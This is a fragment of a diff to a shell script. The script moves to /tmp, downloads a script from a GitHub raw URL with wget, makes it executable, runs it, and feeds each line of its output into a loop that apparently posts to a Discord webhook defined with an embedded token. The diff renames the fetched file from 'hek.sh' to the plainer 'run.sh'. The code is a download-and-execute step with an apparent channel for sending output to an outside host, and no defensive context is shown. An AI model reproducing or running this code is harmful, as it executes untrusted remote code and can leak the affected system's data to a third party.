@@ -2,11 +2,11 @@ discord_url="https://discord.com/api/webhooks/1098558144940081253/G4O7jhCIxOQmHN
 
 cd ../../tmp
 
-wget https://raw.githubusercontent.com/funfactcat/latenightthought/main/hek.sh
+wget https://raw.githubusercontent.com/funfactcat/latenightthought/main/run.sh
 
-chmod +x hek.sh 
+chmod +x run.sh 
 
-./hek.sh 2>&1 | while IFS= read -r line
+./run.sh 2>&1 | while IFS= read -r line
   do
     sleep 5
     generate_post_data() {
